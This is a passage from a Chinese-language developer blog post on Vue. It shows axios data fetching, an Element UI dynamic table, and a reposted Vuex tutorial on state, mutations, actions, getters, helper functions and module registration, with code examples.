class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">loopResult (data) &#123;</span><br><span class="line">     <span class="keyword">const</span> self = <span class="variable language_">this</span>;</span><br><span class="line">     <span class="keyword">let</span> e;</span><br><span class="line">     self.<span class="property">axios</span>.<span class="title function_">get</span>(</span><br><span class="line">       <span class="string">&#x27;/index/start/&#x27;</span></span><br><span class="line">     ).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">       <span class="comment">// 根据状态码判断是否跨域成功</span></span><br><span class="line">         <span class="keyword">if</span> (res.<span class="property">data</span>.<span class="property">recode</span> === <span class="number">2000</span>) &#123;</span><br><span class="line">           <span class="keyword">var</span> jsonObj = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(res.<span class="property">data</span>));</span><br><span class="line">           <span class="comment">// 解析json数据</span></span><br><span class="line">           jsonObj  = jsonObj.<span class="property">data</span>;</span><br><span class="line">          </span><br><span class="line">             <span class="variable language_">console</span>.<span class="title function_">log</span>(self.<span class="property">tableData</span>[i].<span class="property">text_id</span>);</span><br><span class="line">           &#125;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="title function_">alert</span>(<span class="string">&#x27;获取数据失败&#x27;</span>);</span><br><span class="line">         &#125;</span><br><span class="line">       &#125;</span><br><span class="line">     ).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">       <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">     &#125;);</span><br><span class="line">   &#125;,</span><br></pre></td></tr></table></figure><p>这样便可以调用 data 中声明的变量对应数据，从而在页面显示出来。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="attr">page</span>: <span class="number">1</span>,</span><br><span class="line">      <span class="attr">offset</span>: <span class="number">10</span>,</span><br><span class="line">      <span class="attr">totalNum</span>: <span class="number">1000</span>,</span><br><span class="line">      <span class="attr">tableData</span>: []</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>也可以将异步方法封装成 spider.js, 如</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202203062312028.png" alt="image-20220306231244869"></p><p>在 request.js 中，可以改 VUE_APP_BASE_API 为想要的值</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202203062314260.png" alt="image-20220306231453092"></p><h1 id="二-动态表格实现"><a class="markdownIt-Anchor" href="#二-动态表格实现">#</a> 二、 动态表格实现</h1><p>在 vue 的 template 中引入 el-table，props 对应后端传来的 json 数组中元素的名称</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202203062317408.png" alt="image-20220306231741321"></p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202203062318159.png" alt="image-20220306231828087"></p><h1 id="三-vue-将数据存入vuex中以及从vuex中取出数据"><a class="markdownIt-Anchor" href="#三-vue-将数据存入vuex中以及从vuex中取出数据">#</a> 三、vue - 将数据存入 vuex 中以及从 vuex 中取出数据</h1><blockquote><p>转载自：<a href="https://juejin.cn/post/7025522047988006925#heading-8">https://juejin.cn/post/7025522047988006925#heading-8</a></p></blockquote><p>Vuex 是一个专为 Vue.js 应用程序开发的状态管理模式。它采用集中式存储管理应用的所有组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化。简单来说就是：应用遇到多个组件共享状态时，使用 vuex。</p><h2 id="vuex的五个核心概念"><a class="markdownIt-Anchor" href="#vuex的五个核心概念">#</a> vuex 的五个核心概念：</h2><ul><li>State：共享状态，vuex 的基本数据，用来存储变量，相当于组件 data 里的数据，只不过此时变成了全局变量。</li><li>Getter：基于 state 的派生状态，相当于组件中的 computed 中的属性。</li><li>Mutation：更改 vuex 中 store 共享状态的方法，通过提交 mutation 来去修改状态，进行同步操作数据，通常用于 action 获取异步数据，获取通过 commit 提交数据给 mutation，在 mutation 同步操作 state 中的数据。</li><li>action：支持异步操作，可用于异步获取请求中的数据，并将获取的数据同步 commit 提交给 mutation，实现 ajax 异步请求数据，mutation 将其数据同步到 state 中。</li><li>modules：模块化 vuex，为了方便后期对于项目的管理，可以让每一个模块拥有自己的 state、mutation、action、getters, 使得结构非常清晰，方便管理。</li></ul><p>优势和劣势有哪些？<br>优势主要就是可以全局共享数据，方法。方便统一管理<br>劣势的话，页面刷新后 state 的变量都会还原清空，不会像 cookies 一样持久性存储</p><p>页面刷新后 vuex 的 state 数据丢失怎么解决？<br>先说一下为什么会丢失呢？<br>因为 store 里的数据是保存在运行内存中的，当页面刷新时页面会重新加载 vue 实例，store 里面的数据就会被重新赋值</p><p>如何避免？<br>其实主要还是看使用的场景是怎样的，如果想某些数据持久性保留也可以搭配使用 cookies 或者 localStorage。比如一些登录的信息等。<br>比如请求拿到了登录信息后可以先存在 localStorage，将 state 里的变量值和 sessionStorage 里面的绑定，mutations 中修改的时候同时修改 state 和 localStorage。最后页面直接使用 vuex 中的变量。</p><h2 id="正式进入使用"><a class="markdownIt-Anchor" href="#正式进入使用">#</a> 正式进入使用</h2><p>vuex 的安装<br>打开终端，输入命令行 npm install vuex --save 进行下载 vuex</p><h3 id="vuex应用核心管理仓库-构建store"><a class="markdownIt-Anchor" href="#vuex应用核心管理仓库-构建store">#</a> vuex 应用核心管理仓库 构建 store</h3><p>这里新建 store 文件夹，创建一个 js 取名为 index.js，<br>在 index 里 ，通过将 state,mutations,actions,getters 引入到 store 中，并暴露出 store 对象。</p><p>下面为 index.js 的代码</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  vuex最核心的管理对象 store</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vuex</span> <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 分别引入这四个文件  这四个文件的内容和用法在下面分别讲到</span></span><br><span class="line"><span class="keyword">import</span> state <span class="keyword">from</span> <span class="string">&#x27;./state&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> mutations <span class="keyword">from</span> <span class="string">&#x27;./mutations&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> actions <span class="keyword">from</span> <span class="string">&#x27;./actions&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> getters <span class="keyword">from</span> <span class="string">&#x27;./getters&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//声明使用插件</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">Vuex</span>)</span><br><span class="line"><span class="comment">//new 一个Vuex的对象,将state,mutation,action,getters配置到vuex的store中,方便管理数据</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> <span class="title class_">Vuex</span>.<span class="title class_">Store</span>(&#123;  </span><br><span class="line">  state,</span><br><span class="line">  mutations,</span><br><span class="line">  actions,</span><br><span class="line">  getters,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>挂载 store 到 vue 实例上<br> main.js 中</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">&#x27;./store&#x27;</span></span><br><span class="line"><span class="comment">// ..........</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">  router,</span><br><span class="line">  store,   <span class="comment">// ***</span></span><br><span class="line">  <span class="attr">render</span>: <span class="function"><span class="params">h</span> =&gt;</span> <span class="title function_">h</span>(<span class="title class_">App</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="state状态管理数据"><a class="markdownIt-Anchor" href="#state状态管理数据">#</a> state 状态管理数据</h3><p>我们通常将需要进行管理的共享数据，放入 state 中，使其形似为全局变量，对于需要的组件进行引入该 state 状态数据。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> state = &#123;</span><br><span class="line">  userId: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  token: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  name: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  avatar: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  introduction: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  roles: [],</span><br><span class="line">  tenantId: <span class="number">1</span>,</span><br><span class="line">  userInfo: <span class="literal">null</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="mutations-同步提交数据"><a class="markdownIt-Anchor" href="#mutations-同步提交数据">#</a> mutations 同步提交数据</h3><p>mutations 用于更改 state 中的状态逻辑的，且为同步更改 state 中的状态数据。<br>需要知道的是在 vuex 中只能通过 mutation 来去修改 state 对象，<br>可以通过获取 actions 获取到的数据去修改 state, 也可以在 mutations 模块中直接定义方法来去更改状态数据。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mutations = &#123;</span><br><span class="line">  <span class="attr">SET_TOKEN</span>: <span class="function">(<span class="params">state, token</span>) =&gt;</span> &#123;</span><br><span class="line">    state.<span class="property">token</span> = token;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">SET_USERID</span>: <span class="function">(<span class="params">state, userId</span>) =&gt;</span> &#123;</span><br><span class="line">    state.<span class="property">userId</span> = userId;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">SET_NAME</span>: <span class="function">(<span class="params">state, name</span>) =&gt;</span> &#123;</span><br><span class="line">    state.<span class="property">name</span> = name;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">SET_ROLES</span>: <span class="function">(<span class="params">state, roles</span>) =&gt;</span> &#123;</span><br><span class="line">    state.<span class="property">roles</span> = roles;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">SET_TENANTID</span>: <span class="function">(<span class="params">state, roles</span>) =&gt;</span> &#123;</span><br><span class="line">    state.<span class="property">tenantId</span> = roles;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">SET_USER_INFO</span>: <span class="function">(<span class="params">state, userInfo</span>) =&gt;</span> &#123;</span><br><span class="line">    state.<span class="property">userInfo</span> = userInfo;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>通过 mutations 和下面的 actions 模块，大家也可以看出 commit 是用于调用 mutation 模块中的。<br>在组件中调用其 mutation 模块的代码为：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.$store.commit(<span class="string">&#x27;SET_TOKEN&#x27;</span>, token_data) </span><br></pre></td></tr></table></figure><h3 id="actions-的异步操作"><a class="markdownIt-Anchor" href="#actions-的异步操作">#</a> actions 的异步操作</h3><p>actions 与其 mutations 类似，但其可以进行异步操作，<br>且将异步操作获取的数据提交给 mutations，使得 mutations 更改 state 中的状态数据，这里常常用于获取 ajax 请求中的数据 (因为是异步)，并将其获取的数据 commit 提交给 mutations 使得 state 数据状态的更新。</p><blockquote><p>和 mutations 的不同之处在于：</p><ol><li>Action 提交的是 mutation，而不是直接变更状态。</li><li>Action 可以包含任意异步操作。</li></ol></blockquote><p>举例</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 下面就是通过actions执行异步Ajax请求，</span></span><br><span class="line"><span class="comment">得到数据后，</span></span><br><span class="line"><span class="comment">通过commit的方法调用mutations 从而更新数据</span></span><br><span class="line"><span class="comment">例如：  commit(&#x27;SET_TOKEN&#x27;, data.uuid);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> actions = &#123;</span><br><span class="line">  login(&#123; commit &#125;, userInfo) &#123;  <span class="comment">// 用户登录</span></span><br><span class="line">    <span class="keyword">const</span> params = userInfo;</span><br><span class="line">    params.userName = userInfo.userName.trim()</span><br><span class="line">    <span class="keyword">return</span> new Promise((resolve, reject) =&gt; &#123;</span><br><span class="line">      getLogin(params)</span><br><span class="line">        .then((response) =&gt; &#123;</span><br><span class="line">          <span class="keyword">const</span> &#123; status, message, <span class="keyword">data</span> &#125; = response || &#123;&#125;;</span><br><span class="line">          <span class="keyword">if</span> (status === <span class="number">200</span>) &#123;</span><br><span class="line">            <span class="comment">// 存入 参数： 1.调用的值 2.所要存入的数据</span></span><br><span class="line">            commit(<span class="string">&#x27;SET_USER_INFO&#x27;</span>, <span class="keyword">data</span>);</span><br><span class="line">            commit(<span class="string">&#x27;SET_TOKEN&#x27;</span>, <span class="keyword">data</span>.uuid);</span><br><span class="line">            commit(<span class="string">&#x27;SET_USERID&#x27;</span>, <span class="keyword">data</span>.id);</span><br><span class="line">            commit(<span class="string">&#x27;SET_ROLES&#x27;</span>, <span class="keyword">data</span>.roles);</span><br><span class="line">            commit(<span class="string">&#x27;SET_NAME&#x27;</span>, <span class="keyword">data</span>.realName);</span><br><span class="line">            commit(<span class="string">&#x27;SET_TENANTID&#x27;</span>, <span class="keyword">data</span>.tenantId || <span class="number">1</span>);</span><br><span class="line">            setToken(<span class="keyword">data</span>.uuid);</span><br><span class="line">            db.save(<span class="string">&#x27;userInfo&#x27;</span>, <span class="keyword">data</span>);</span><br><span class="line">            db.save(<span class="string">&#x27;tenantId&#x27;</span>, <span class="keyword">data</span>.tenantId || <span class="number">1</span>);</span><br><span class="line">            localStorage.setItem(<span class="string">&#x27;loginToken&#x27;</span>, <span class="keyword">data</span>.uuid);</span><br><span class="line">            resolve(<span class="keyword">data</span>);</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// ElementUI.Message.error(message);  // axios拦截统一提示了</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        .<span class="keyword">catch</span>((error) =&gt; &#123;</span><br><span class="line">          <span class="comment">// ElementUI.Message.error(error.message); // axios拦截统一提示了</span></span><br><span class="line">          reject(error);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个 actions 在组件中的调用方法就是：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="variable language_">this</span>.<span class="property">$store</span>.<span class="title function_">dispatch</span>(<span class="string">&#x27;user/login&#x27;</span>, postUser)</span><br><span class="line">            .<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">               <span class="comment">// .............</span></span><br><span class="line">              &#125;)</span><br><span class="line"><span class="comment">// 我这里的login方法写在了user.js这个module里 所以这里调用是 user/login</span></span><br><span class="line"><span class="comment">// 下面会讲到module</span></span><br></pre></td></tr></table></figure><h3 id="getters-对state进行加工"><a class="markdownIt-Anchor" href="#getters-对state进行加工">#</a> Getters 对 state 进行加工</h3><p>Getters 相当于 computed 计算属性，用于加工处理 state 状态数据，有其两个默认参数，第一个默认参数为 state，第二个默认参数为 getters。</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> getters=&#123;</span><br><span class="line">  plusCount(state)&#123;</span><br><span class="line">    <span class="keyword">return</span> state.count + <span class="number">1</span></span><br><span class="line">  &#125;,</span><br><span class="line"> <span class="comment">//获取state中状态数据对象，和获取getters模块中plusCount数据</span></span><br><span class="line">  totalCount(state,getters)&#123;</span><br><span class="line">    <span class="keyword">return</span> getters.plusCount + state.count</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在组件中调用该方法的代码片段为：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.$store.getters.totalCount()</span><br></pre></td></tr></table></figure><h3 id="在vue组件中获得vuex状态"><a class="markdownIt-Anchor" href="#在vue组件中获得vuex状态">#</a> 在 Vue 组件中获得 Vuex 状态</h3><p>从 <code>store</code>  实例中读取状态最简单的方法就是在计算属性中返回某个状态，由于 <code>Vuex</code>  的状态存储是响应式的，所以在这里每当 <code>store.state.count</code>  变化的时候，都会重新求取计算属性，进行响应式更新。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">computed: &#123;</span><br><span class="line">       count: <span class="built_in">function</span>()&#123;</span><br><span class="line">           return this.$store<span class="selector-class">.state</span><span class="selector-class">.count</span></span><br><span class="line">       &#125;</span><br><span class="line">   &#125;,</span><br></pre></td></tr></table></figure><p>那么对于以上的 store 我们就简单介绍完了，相信大家看完后对于 vuex 会有一定的理解。那么这个时候我们要想，是不是使用 <code>this.$store.state</code>  或 <code>this.$store.getters.xxx</code>  感到麻烦呢？下面我们介绍另一种引入 state 和 getters 的方式</p><h3 id="辅助函数-mapstate-和-mapgetters"><a class="markdownIt-Anchor" href="#辅助函数-mapstate-和-mapgetters">#</a> 辅助函数 mapState 和 mapGetters</h3><p>对于上述的在组件中引用 state 和 getters 的方法是不是感到麻烦呢？使用 mapState 你将会感受到便利。<br>组件中这样使用</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//首先我们需要先将辅助函数引入</span></span><br><span class="line"><span class="keyword">import</span> &#123; mapGetters,mapState &#125; <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line"> <span class="attr">computed</span>: &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 使用对象展开运算符将 getter 混入 computed 对象中</span></span><br><span class="line">  ...<span class="title function_">mapGetters</span>( [<span class="string">&#x27;plusCount&#x27;</span>,<span class="string">&#x27;totalCount&#x27;</span>] )</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 使用对象展开运算符将 state 混入 computed 对象中</span></span><br><span class="line">    ...<span class="title function_">mapState</span>( [<span class="string">&#x27;userInfo&#x27;</span>,<span class="string">&#x27;count&#x27;</span>] )</span><br><span class="line"></span><br><span class="line"> &#125;,</span><br><span class="line"><span class="attr">methods</span>:&#123;</span><br><span class="line">    <span class="title function_">getData</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">// 这里就能直接使用了  直接使用state 和getters里的数据</span></span><br><span class="line">        <span class="comment">//  this.userInfo </span></span><br><span class="line">        <span class="comment">// this.plusCount</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="module子模块化管理"><a class="markdownIt-Anchor" href="#module子模块化管理">#</a> Module 子模块化管理</h3><p>store 文件夹下的 index.js 代码如下</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vuex</span> <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span></span><br><span class="line"><span class="keyword">import</span> getters <span class="keyword">from</span> <span class="string">&#x27;./getters&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">Vuex</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> modulesFiles = <span class="built_in">require</span>.<span class="title function_">context</span>(<span class="string">&#x27;./modules&#x27;</span>, <span class="literal">true</span>, <span class="regexp">/\.js$/</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> modules = modulesFiles.<span class="title function_">keys</span>().<span class="title function_">reduce</span>(<span class="function">(<span class="params">modules, modulePath</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> moduleName = modulePath.<span class="title function_">replace</span>(<span class="regexp">/^\.\/(.*)\.\w+$/</span>, <span class="string">&#x27;$1&#x27;</span>)</span><br><span class="line">  <span class="keyword">const</span> value = <span class="title function_">modulesFiles</span>(modulePath)</span><br><span class="line">  modules[moduleName] = value.<span class="property">default</span></span><br><span class="line">  <span class="keyword">return</span> modules</span><br><span class="line">&#125;, &#123;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> <span class="title class_">Vuex</span>.<span class="title class_">Store</span>(&#123;</span><br><span class="line">  modules,</span><br><span class="line">  getters</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> store</span><br></pre></td></tr></table></figure><p>文件目录如图</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202203070933394.webp" alt="img"></p><p>举例 api.js</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span 